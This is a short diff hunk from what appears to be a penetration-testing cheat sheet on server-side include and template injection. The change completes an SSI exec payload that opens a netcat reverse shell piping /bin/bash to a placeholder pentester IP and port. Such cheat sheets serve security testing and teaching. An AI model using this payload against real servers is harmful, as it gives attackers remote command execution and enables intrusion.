@@ -87,7 +87,7 @@ Code: html
 ```
 Reverse Shell
 Code: html
-<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
 ```
 ### tplmap.py
 ### SSTI Exploitation Example 1
